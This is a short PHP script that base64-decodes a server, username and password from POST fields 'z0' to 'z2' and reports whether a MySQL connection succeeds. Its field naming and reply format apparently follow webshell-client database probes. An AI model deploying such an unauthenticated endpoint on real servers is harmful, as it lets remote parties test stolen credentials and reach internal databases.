<?php
$servername = base64_decode($_POST['z0']);
$username = base64_decode($_POST['z1']);
$password = base64_decode($_POST['z2']);
$dbname = "information_schema";

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);

// Check connection
if (!$conn) {
    die("0|Connection failed: " . mysqli_connect_error());
}
echo "1|";

// Close connection
mysqli_close($conn);
?>